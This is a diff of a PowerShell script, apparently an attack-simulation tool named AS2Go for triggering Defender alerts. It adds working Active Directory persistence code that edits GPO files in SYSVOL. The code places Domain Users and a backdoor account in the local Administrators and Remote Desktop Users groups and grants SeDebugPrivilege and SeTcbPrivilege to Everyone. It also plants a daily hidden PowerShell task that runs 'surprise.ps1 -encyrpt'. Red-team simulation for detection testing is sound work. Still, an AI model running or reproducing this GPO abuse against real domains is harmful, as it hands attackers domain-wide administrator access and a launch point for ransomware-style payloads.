@@ -21,8 +21,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2023-09-09
-File Name  : AS2Go.ps1 | Version 2.9.x
+last update: 2023-10-08
+File Name  : AS2Go.ps1 | Version 3.0.x
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -102,9 +102,15 @@ https://learn.microsoft.com/en-us/windows-server/security/credentials-protection
 https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
 https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates
 
-
-
 #>
+
+<#
+My IDEAS
+PS C:\Windows\system32> Get-Service -ComputerName "ch01-dc19-01"| Sort-Object status | ogv -Title "Services - Server01"
+PS C:\Windows\system32> Get-Process -ComputerName "ch01-dc19-01" | ogv -Title "Processes - Server01"
+#>
+
+
 #Check if the current Windows PowerShell session is running as Administrator. 
 #If not Start Windows PowerShell by  using the Run as Administrator option, and then try running the script again.
 
@@ -125,7 +131,7 @@ Param (
     [switch]$SkipDataExfiltration,
     [switch]$SkipDomainPersistence,
     [switch]$SkipForgeAuthCertificates, 
-    [switch]$SkipKerberoastingAttack, 
+    [switch]$SkipKerberoastingAttack,
     [switch]$DeveloperMode
   )
 
@@ -137,9 +143,20 @@ Param (
 ######                                                                     #####
 ################################################################################
 
-$lastupdate = "2023-09-10"
-$version = "2.9.0"
-# 2022-09-10 | v2.9.0 |  Upload to Github
+$lastupdate = "2023-10-08"
+$version = "3.0.0"
+
+# 2023-10-08 | v3.0.0 |  Upload to Github       
+# 2023-10-08 | v2.9.9 |  Update  Region Attack Level - DOMAIN COMPROMISED AND PERSISTENCE             
+# 2023-10-06 | v2.9.8 |  Add-GPOScheduleTask & Add-TaskElementToFileScheduleTaskXml
+# 2023-09-28 | v2.9.7 |  Add-GPOUserRightAssignments
+# 2023-09-27 | v2.9.6 |  Set-gPCmachineExtensionNames
+# 2023-09-26 | v2.9.5 |  Add-GroupElementToFileGroupsXml
+# 2023-09-26 | v2.9.4 |  Add-GPOMemberToBuiltinGroups and Add-TrusteeToFileGroupsXml
+# 2023-09-25 | v2.9.3 |  Add Function New-GPOManipulation
+# 2023-09-13 | v2.9.2 |  Add Function Get-GPOLinkedOnDomain and Get-GPOSettings
+# 2023-09-13 | v2.9.1 |  Update function Get-RiskyEnrolledTemplates, support of multiple enrollment services
+# 2023-09-10 | v2.9.0 |  Upload to Github
 # 2023-09-09 | v2.8.6 |  minor updates
 # 2023-08-29 | v2.8.5 |  Update Function Get-KerberosTGT
 # 2023-08-27 | v2.8.4 |  Update Function New-PrivilegeEscalationRecommendation
@@ -183,7 +200,7 @@ $version = "2.9.0"
 # 2022-08-09 | v2.0.6 |  Update Function Start-Reconnaissance
 # 2022-01-21 | v2.0.5 |  Update Function Restart-VictimMachines
 # 2022-01-18 | v2.0.4 |  Update Function New-RansomareAttack
-# 2022-01-11 | v2.0.3 |  Add    Function New-RansomareAttack
+# 2022-01-11 | v2.0.3 |  Add  Function New-RansomareAttack
 
 
 ################################################################################
@@ -198,10 +215,6 @@ $version = "2.9.0"
 [bool]$skipstep = $false # show the steps in an image
 
 $PublishedRiskyTemplates = New-Object System.Collections.ArrayList
-
-
-
-
 
 $path = Get-Location
 $scriptName = $MyInvocation.MyCommand.Name
@@ -290,6 +303,849 @@ function MyTemplate {
 
     return $true
 }
+
+function Set-gPCmachineExtensionNames {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####  Modifiy attribute gPCmachineExtensionNames to display GPO settings  #####                            
+    #####                                                                      #####
+    ################################################################################
+
+    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/12512ed6-0632-4e90-a112-d3d2cd41df6c
+
+
+    Param([string] $GUID, [string] $CLSIDs)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    $GUID = "{" + $GUID + "}"
+    $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
+    $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
+
+    $Both = "[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
+    $onlyGroup = "[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"
+    $onlyScheduleTask = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
+    $default = "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"
+
+    $idScheduleTask = "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}"
+    $idLocalGroup = "{79F92669-4224-476C-9C5C-6EFB4D87DF4A}"
+
+    $GPO = Get-AdObject -Filter 'ObjectClass -eq "groupPolicyContainer" -and Name -eq $GUID' -Properties gPCmachineExtensionNames, DistinguishedName, name,objectClass | Select-Object gPCmachineExtensionNames, DistinguishedName
+    Write-Log -Message "    >> old value $($gpo.gPCmachineExtensionNames)"
+
+    if ($CLSIDs -eq "{0}") {
+        $newvalue = $default
+    }
+    elseif ($CLSIDs -eq $ScheduledTasks) {
+
+        if ($gpo.gPCmachineExtensionNames.Contains($idLocalGroup)){
+            $newvalue = $Both
+        }
+        else {
+            $newvalue = $onlyScheduleTask
+        }
+    }
+    elseif ($CLSIDs -eq $Groups) {
+        if ($gpo.gPCmachineExtensionNames.Contains($idScheduleTask)){
+            $newvalue = $Both
+        }
+        else {
+            $newvalue = $onlyGroup
+        }
+    }
+    else {
+
+    }
+
+    Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+
+    Write-Log -Message "    >> new value $newvalue"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+}
+
+function Add-GroupElementToFileGroupsXml {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Add a new built-in Group to the Groups.xml file                   #####                                
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $xmlFilePath, [string] $GroupName, [string] $GroupSID)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+   # $GroupName = "GroupName2"
+   # $GroupSID = "S-1-5-32-552"
+   # $xmlFilePath = "c:\temp\1.xml"
+
+
+    [xml]$xml = Get-Content $xmlFilePath
+
+    $newGUID = "{" + (New-Guid).ToString().ToUpper() + "}"
+
+    $newGroup = $xml.CreateElement("Group")
+    $newGroup.SetAttribute("clsid", "{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}")
+    $newGroup.SetAttribute("name", $GroupName)
+    $newGroup.SetAttribute("image", "2")
+    $newGroup.SetAttribute("changed", "2022-09-28 11:51:44")
+    $newGroup.SetAttribute("uid", $newGUID)
+    $newGroup.SetAttribute("userContext", "0")
+    $newGroup.SetAttribute("removePolicy", "0")
+
+    $newProperties = $xml.CreateElement("Properties")
+    $newProperties.SetAttribute("action", "U")
+    $newProperties.SetAttribute("newName", "")
+    $newProperties.SetAttribute("description", "")
+    $newProperties.SetAttribute("deleteAllUsers", "0")
+    $newProperties.SetAttribute("deleteAllGroups", "0")
+    $newProperties.SetAttribute("removeAccounts", "0")
+    $newProperties.SetAttribute("groupSid", $GroupSID)
+    $newProperties.SetAttribute("groupName", $GroupName)
+
+    $newMembers = $xml.CreateElement("Members")
+    $newProperties.AppendChild($newMembers) | Out-Host
+    $newGroup.AppendChild($newProperties) | Out-Host
+    $groupsElement = $xml.SelectSingleNode("//Groups")
+    $groupsElement.AppendChild($newGroup) | Out-Host
+
+    $xml.Save($xmlFilePath)
+
+    Write-Log -Message "    >> adding $GroupName ($GroupSID) to file $xmlFilePath"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    #  return $true
+}
+
+function Add-TrusteeToFileGroupsXml {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Add a Trustee incl. SID to the Groups.xml file                    #####                                
+    #####                                                                      #####
+    ################################################################################
+
+    Param([string] $xmlFilePath, [string] $LocalGroup, [string] $Trustee, [string] $SID)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    [xml]$xml = Get-Content $xmlFilePath
+    $remoteDesktopUsersGroup = $xml.SelectSingleNode("//Group[@name='$LocalGroup']")           
+    $newMember = $xml.CreateElement("Member")
+    $newMember.SetAttribute("name", $Trustee)
+    $newMember.SetAttribute("action", "ADD")
+    $newMember.SetAttribute("sid", $SID )
+    $membersElement = $remoteDesktopUsersGroup.SelectSingleNode("Properties/Members")
+    $membersElement.AppendChild($newMember) | Out-Host
+    $xml.Save($xmlFilePath)
+    Write-Log -Message "    >> added trustee $Trustee to file Groups.xml under $LocalGroup."
+    
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+}
+
+function Add-GPOUserRightAssignments {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####      Add or Update User Rights Assignment                            #####                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $ID, [String] $name)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "        Add or Update User Rights Assignment"
+    Write-Host "____________________________________________________________________`n"  
+
+    Write-Host "   Affected GPO - " -NoNewline;Write-Host $name -ForegroundColor Yellow -NoNewline;Write-Host " {$ID}"
+
+    If ($UnAttended) {
+        $answer = $yes 
+    }
+    else {
+        $question = "Do you want to run this step - Y or N? Default "
+        $answer = Get-Answer -question $question -defaultValue $Yes
+    }
+
+    If ($answer -eq $yes) {
+
+        If ($answer -eq $yes) {
+
+            #define the target file
+            $logonserver = (($env:LOGONSERVER).Replace("\","")).ToLower()
+            $domainDNS = ($env:USERDNSDOMAIN).ToLower()
+            $infFilePath = "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
+    
+    
+            If (!(Test-Path $infFilePath)) {
+    
+                New-Item -Name "Machine" -ItemType Directory -Path "\\$logonservern\SYSVOL\$domainDNS\\Policies\{$ID}" -ErrorAction Ignore | Out-Null
+                New-Item -Name "Microsoft" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
+                New-Item -Name "Windows NT" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\\Policies\{$ID}\Machine\Microsoft" -ErrorAction Ignore | Out-Null
+                New-Item -Name "SecEdit" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\\Policies\{$ID}\Machine\Microsoft\Windows NT" -ErrorAction Ignore | Out-Null
+            
+                Write-Log -Message "    >> created path: \\$logonserver\SYSVOL\$domainDNS\\Policies\{$ID}\Machine\Microsoft\Windows NT\SecEdit"
+                
+                "[Unicode]" | Add-Content -Path $infFilePath
+                start-sleep 1
+                "Unicode=yes" | Add-Content -Path $infFilePath
+                start-sleep 1
+                "[Version]" | Add-Content -Path $infFilePath
+                start-sleep 1
+                'signature="$CHICAGO$"' | Add-Content -Path $infFilePath
+                start-sleep 1
+                "Revision=1" | Add-Content -Path $infFilePath 
+                start-sleep 1
+
+                Write-Log -Message "    >> created file: $infFilePath"
+
+
+            }
+            else {
+                Write-Log -Message "    >> found file: $infFilePath"
+            }
+        }
+
+        $FileContent = Get-Content -Path $infFilePath
+
+        [bool]$PrivilegeRights = $false
+        [bool]$SeDebugPrivilege = $false
+        [bool]$SeTcbPrivilege = $false
+        [bool]$SeRemoteInteractiveLogonRight = $false
+        
+        [int]$i = 0
+        [string]$result = ""
+        Foreach ($result in $FileContent) {
+        
+        
+            If ($result.Equals("[Privilege Rights]")) {
+                [string]$PrivilegeRightsV = $result
+                [int]$PrivilegeRightsl = $i
+                $PrivilegeRights = $true
+            }
+            elseif ($result.StartsWith("SeDebugPrivilege")) {
+        
+                $SeDebugPrivilege = $true
+                [int]$SeDebugPrivilegeL = $i
+                [string]$SeDebugPrivilegeV = $result
+            }
+            elseif ($result.StartsWith("SeTcbPrivilege")) {
+        
+                $SeTcbPrivilege = $true
+                [int]$SeTcbPrivilegeL = $i
+                [string]$SeTcbPrivilegeV = $result
+            }
+            elseif ($result.StartsWith("SeRemoteInteractiveLogonRight")) {
+        
+                $SeRemoteInteractiveLogonRight = $true
+                [int]$SeRemoteInteractiveLogonRightL = $i
+                [string]$SeRemoteInteractiveLogonRightV= $result
+            }
+            else {
+            }
+            $i++
+        }
+        
+    
+        
+        If (-not $PrivilegeRights) {
+            # no Privilege Rights available, create the whole set
+            "[Privilege Rights]" | Add-Content -Path $infFilePath 
+            "SeTcbPrivilege = *S-1-1-0" | Add-Content -Path $infFilePath 
+            "SeDebugPrivilege = *S-1-1-0" | Add-Content -Path $infFilePath 
+            "SeRemoteInteractiveLogonRight = *S-1-1-0"  | Add-Content -Path $infFilePath  
+        }
+        else {
+            # just add or modify the SeRemoteInteractiveLogonRight trustee
+            If (-not $SeRemoteInteractiveLogonRight) {
+                $fileContent[$PrivilegeRightsl] += "`nSeRemoteInteractiveLogonRight = *S-1-1-0"
+                $fileContent | Set-Content $infFilePath
+            }
+            else {
+                $fileContent[$SeRemoteInteractiveLogonRightL] = $SeRemoteInteractiveLogonRightV + ',*S-1-5-11'
+                $fileContent | Set-Content -Path $infFilePath
+            }
+        
+            If (-not $SeTcbPrivilege) {
+        
+                $fileContent[$PrivilegeRightsl] += "`nSeTcbPrivilege = *S-1-1-0"
+                $fileContent | Set-Content $infFilePath
+            }
+            else {
+                $fileContent[$SeTcbPrivilegeL] = $SeTcbPrivilegeV + ',*S-1-5-11'
+                $fileContent | Set-Content -Path $infFilePath
+            }
+            
+            # just add or modify the $SeDebugPrivilege trustee
+            If (-not $SeDebugPrivilege) {
+                $fileContent[$PrivilegeRightsl] += "`nSeDebugPrivilege = *S-1-1-0"
+                $fileContent | Set-Content $infFilePath
+            }   
+            else {
+                $fileContent[$SeDebugPrivilegeL] = $SeDebugPrivilegeV + ',*S-1-5-11'
+                $fileContent | Set-Content -Path $infFilePath
+        
+            }
+        }  
+    }
+    else {
+        Write-Log -Message "    >> Skipped!"
+    }
+                  
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+   
+}
+
+
+function Add-TaskElementToFileScheduleTaskXml {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Add a Task to file ScheduledTasks.xml                             #####                                
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $xmlFilePath)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    [datetime]$tomorrow = (Get-Date).AddDays(1)
+    [xml]$xml = Get-Content $xmlFilePath
+
+    $sPrefix = Get-Date -Format HHmmss
+    $sSuffix = Get-Date -Format yyyyMMdd
+    $sNewName = "ST-$sSuffix.$sPrefix"
+
+    $result = $xmlFilePath.Split("\")[4]
+
+
+    $newGUID = "{" + (New-Guid).ToString().ToUpper() + "}"
+
+    # Create the Task element
+    $newTask = $xml.CreateElement("Task")
+    $newTask.SetAttribute("clsid", "{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}")
+    $newTask.SetAttribute("name", "Attack Level - DOMAIN COMPROMISED AND PERSISTENCE")
+    $newTask.SetAttribute("image", "2")
+    $newTask.SetAttribute("changed", "1601-01-01 00:00:01")
+    $newTask.SetAttribute("uid", $newGUID)
+    $newTask.SetAttribute("userContext", "0")
+    $newTask.SetAttribute("removePolicy", "0")
+    $newTask.SetAttribute("desc", "A bad actor was here - " + (get-date))
+
+
+
+    # Create the Properties element
+    $newProperties = $xml.CreateElement("Properties")
+    $newProperties.SetAttribute("deleteWhenDone", "0")
+    $newProperties.SetAttribute("startOnlyIfIdle", "0")
+    $newProperties.SetAttribute("stopOnIdleEnd", "0")
+    $newProperties.SetAttribute("noStartIfOnBatteries", "0")
+    $newProperties.SetAttribute("stopIfGoingOnBatteries", "0")
+    $newProperties.SetAttribute("systemRequired", "1")
+    $newProperties.SetAttribute("action", "U")
+    $newProperties.SetAttribute("name", $sNewName)
+    $newProperties.SetAttribute("appName", "cmd.exe")
+    $newProperties.SetAttribute("args", "/c powershell.exe -nop -w hidden \\$result\SYSVOL\$result\scripts\surprise.ps1 -encyrpt")
+    $newProperties.SetAttribute("startIn", "C:\")
+    $newProperties.SetAttribute("comment", "created by AS2Go!")
+    $newProperties.SetAttribute("enabled", "1")
+
+    #Create the Triggers element
+    $newtriggers = $xml.CreateElement("Triggers")
+
+    # Create the Trigger element
+    $newTrigger = $xml.CreateElement("Trigger")
+    $newTrigger.SetAttribute("type", "DAILY")
+    $newTrigger.SetAttribute("startHour", "06")
+    $newTrigger.SetAttribute("startMinutes", "00")
+    $newTrigger.SetAttribute("beginYear", $tomorrow.Year )
+    $newTrigger.SetAttribute("beginMonth", $tomorrow.Month)
+    $newTrigger.SetAttribute("beginDay", $tomorrow.Day)
+    $newTrigger.SetAttribute("hasEndDate", "0")
+    $newTrigger.SetAttribute("repeatTask", "0")
+    $newTrigger.SetAttribute("interval", "1")
+
+    $newTriggers.AppendChild($newTrigger) | Out-Host
+    $newProperties.AppendChild($newTriggers) | Out-Host
+    $newTask.AppendChild($newProperties) | Out-Host
+    $xml.ScheduledTasks.AppendChild($newTask) | Out-Host
+
+    $xml.Save($xmlFilePath)
+
+    Write-Log -Message "    >> adding Task $sNewName to file $xmlFilePath"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+}
+
+function Add-GPOScheduleTask {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####      Add a malicious scheduled task                                 #####                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $ID, [String] $name)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "        Add a Malicious Scheduled Task                         "
+    Write-Host "____________________________________________________________________`n"  
+
+    Write-Host "   Affected GPO - " -NoNewline;Write-Host $name -ForegroundColor Yellow -NoNewline;Write-Host " {$ID}"
+
+    If ($UnAttended) {
+        $answer = $yes 
+    }
+    else {
+        $question = "Do you want to run this step - Y or N? Default "
+        $answer = Get-Answer -question $question -defaultValue $Yes
+    }
+
+    If ($answer -eq $yes) {
+
+        #define the target file
+        $logonserver = (($env:LOGONSERVER).Replace("\","")).ToLower()
+        $domainDNS = ($env:USERDNSDOMAIN).ToLower()
+        $xmlFilePath = "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+
+
+        If (!(Test-Path $xmlFilePath)) {
+
+            New-Item -Name "Machine" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID" -ErrorAction Ignore | Out-Null
+            New-Item -Name "Preferences" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
+            New-Item -Name "ScheduledTasks" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences" -ErrorAction Ignore | Out-Null
+            
+            Write-Log -Message "    >> created path: \\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\ScheduledTasks\"
+
+            #Copy-Item  -Path.\ScheduledTasks.xml -Destination $xmlFilePath
+
+            $xml = New-Object XML
+            $ScheduledTasksElement = $xml.CreateElement("ScheduledTasks")
+            $ScheduledTasksElement.SetAttribute("clsid", "{CC63F200-7309-4ba0-B154-A71CD118DBCC}")
+            $xml.AppendChild($ScheduledTasksElement) | Out-Host
+            $xml.Save($xmlFilePath)
+        
+            $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
+            $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
+            Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $ScheduledTasks
+
+            Start-Sleep 1
+            Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
+
+
+
+        }
+        else {
+            Write-Log -Message "    >> found file: $xmlFilePath"
+            Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
+        }
+
+
+
+       # Get-GPOSettings -ID $id -Name $name -postfix 'after'    
+
+    }
+    else {
+        Write-Log -Message "    >> Skipped!"
+    }
+                  
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+   # return $true
+}
+
+function Add-GPOMemberToBuiltinGroups {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####      Add or Update to Built-in Admin Groups                          #####                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $ID, [String] $name)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "        Add or Update to Built-in Admin Groups                         "
+    Write-Host "____________________________________________________________________`n"
+
+    Write-Host "   Affected GPO - " -NoNewline; Write-Host $name -ForegroundColor Yellow -NoNewline; Write-Host " {$ID}"
+    
+    If ($UnAttended) {
+        $answer = $yes 
+    }
+    else {
+        $question = "Do you want to run this step - Y or N? Default "
+        $answer = Get-Answer -question $question -defaultValue $Yes
+    }
+
+    If ($answer -ne $yes) {
+        Write-Log -Message "    >> Skipped!"
+    }
+    else {
+
+        [bool]$blocaladmins = $false
+        [bool]$rdu = $false
+        $xml = New-Object XML
+
+        #define the target file
+        $logonserver = (($env:LOGONSERVER).Replace("\", "")).ToLower()
+        $domainDNS = ($env:USERDNSDOMAIN).ToLower()
+        $xmlFilePath = "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\Groups.xml"
+
+        #define the new trustee, e.g. the domain users
+        $domain = $env:USERDOMAIN
+        $domainSID = (Get-ADDomain).DomainSID.value
+        $domainusersName = (Get-ADGroup -Filter * -Properties name | Where-Object { ($_.SID -like "*-513") }).name
+        $domainusersSID = $domainSID + "-513"
+        $newtrustee = $domain + "\" + $domainusersName
+
+
+        $GroupLocalAdmin = "Administrators (built-in)"
+        $GroupRemoteDesktopUser = "Remote Desktop Users (built-in)"
+        $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
+        $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
+
+        #first check for file .\Machine\Preferences\Groups\Groups.xml
+        #and create the file if needed with a corresponding trustee
+        If (!(Test-Path $xmlFilePath)) {
+
+            New-Item -Name "Machine" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID" -ErrorAction Ignore | Out-Null
+            New-Item -Name "Preferences" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
+            New-Item -Name "Groups" -ItemType Directory -Path "\\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences" -ErrorAction Ignore | Out-Null
+       
+            Write-Log -Message "    >> created path: \\$logonserver\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\"
+
+            # create core element 'Groups'
+            $groupsElement = $xml.CreateElement("Groups")
+            $groupsElement.SetAttribute("clsid", "{3125E937-EB16-4b4c-9934-544FC6D24D26}")
+            $xml.AppendChild($groupsElement) | Out-Host
+            $xml.Save($xmlFilePath)
+
+            Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $Groups
+            Start-Sleep 1
+            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
+
+        }
+ 
+        Write-Log -Message "    >> found file: $xmlFilePath"
+         
+            
+        [xml]$xml = Get-Content $xmlFilePath
+            
+        # check if Administrators (built-in) exists
+        $result = $xml.SelectSingleNode("//Group[@name='$GroupLocalAdmin']")
+        if ($null -eq $result) { $blocaladmins = $false } else { $blocaladmins = $true }
+        Write-Log -Message "    >> $GroupLocalAdmin exists: $blocaladmins"
+            
+        # check if Remote Desktop Users (built-in) exists
+        $result = $xml.SelectSingleNode("//Group[@name='$GroupRemoteDesktopUser']")
+        if ($null -eq $result) { $rdu = $false } else { $rdu = $true }
+        Write-Log -Message "    >> $GroupRemoteDesktopUser exists: $rdu"
+               
+
+        If ($blocaladmins -eq $false) {
+            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
+        }
+        
+        If ($rdu -eq $false) {
+            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupRemoteDesktopUser -GroupSID "S-1-5-32-555"
+        }
+        
+
+        #   $members = $remoteDesktopUsersGroup.Properties.Members.Member
+        #   $result = $members | Where-Object { $_.sid -like "*-513" }
+        #   if ($result -ne $null) {
+        #       $newtrustee = "SB\hjhdsgfhdjg"
+        #       $domainusersSID = "dsjgkdsfgldfjhk"
+        #   }
+
+
+        Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupLocalAdmin -Trustee $newtrustee -SID $domainusersSID
+        Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupRemoteDesktopUser -Trustee $newtrustee -SID $domainusersSID
+
+        $LatestBackdoorUser = Get-KeyValue -key "LastBDUser"
+        $AdditionalUser = Get-ADUser -Identity $LatestBackdoorUser 
+        If ($null -ne $AdditionalUser) {
+            $newtrustee = $domain + "\" + $AdditionalUser.SamAccountName
+            $domainusersSID = $AdditionalUser.SID
+            Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupLocalAdmin -Trustee $newtrustee -SID $domainusersSID
+        }
+
+    }
+
+    Pause
+
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    #    return $true
+}
+
+function New-GPOManipulation {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Export GPO Settings in HTML File and open the file                #####                          
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $ID, [String] $name)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    $GPOManipulation = "M"
+
+    Do {
+        $repeat = $yes
+        Clear-Host
+        Write-Host "____________________________________________________________________`n" 
+        Write-Host "       GPT Manipulation - Choose your Technique                     "
+        Write-Host "____________________________________________________________________`n" 
+
+        Write-Host "During this attack, AS2Go will only add " -NoNewline
+        Write-Host "Domain Users, Authenticated Users or Everyone" -ForegroundColor Yellow -NoNewline
+        Write-Host "!`n"
+        
+        
+
+        Write-Host "   M" -ForegroundColor Yellow -NoNewline; Write-Host " - to add members to the built-in Administrators & Remote Desktop Users Group"
+        Write-Host "   S" -ForegroundColor Yellow -NoNewline; Write-Host " - to add a Schedule Task"
+        Write-Host "   U" -ForegroundColor Yellow -NoNewline; Write-Host " - to add User Rights Assignment"
+        Write-Host "`n   X" -ForegroundColor Yellow -NoNewline; Write-Host " - to EXIT the GPT Manipulation"
+
+
+        If ($UnAttended) {
+            $answer = $yes 
+        }
+        else {
+            $question = "Enter or confirm your technique here! Default "
+            $answer = Get-Answer -question $question -defaultValue $GPOManipulation
+        }
+
+
+        switch ($answer) {
+
+            "M" {
+                Add-GPOMemberToBuiltinGroups -ID $ID -Name $name
+                Get-GPOSettings -ID $ID -Name $name -postfix 'after'
+                $GPOManipulation = "S"
+            }
+            "S" {
+
+                Add-GPOScheduleTask -ID $ID -Name $name
+                Get-GPOSettings -ID $ID -Name $name -postfix 'after'
+                $GPOManipulation = "U"
+            }
+            "U" {
+
+                Add-GPOUserRightAssignments -ID $ID -Name $name
+                Get-GPOSettings -ID $ID -Name $name -postfix 'after'
+                $GPOManipulation = "M"
+            }
+            "X" {
+                $repeat = $no
+            }
+
+            default {
+                Write-Host "out of scope"
+            }
+        }
+        Clear-Host
+
+    } Until ($repeat -eq $no)
+
+
+
+   # Clear-Host
+    <#
+    
+
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "       GPT Manipulation - Choose your Technique                     "
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "  U" -ForegroundColor Yellow -NoNewline; Write-Host " - to add User Rights Assignment"
+    Write-Host "  B" -ForegroundColor Yellow -NoNewline; Write-Host " - to add members to the built-in Administrators & Remote Desktop Users Group"
+    Write-Host "  S" -ForegroundColor Yellow -NoNewline; Write-Host " - to add a Schedule Task"
+    
+
+
+    Write-host "`nSelected GPO " -NoNewline
+    Write-host "$name " -ForegroundColor Yellow
+
+    pause
+
+#>
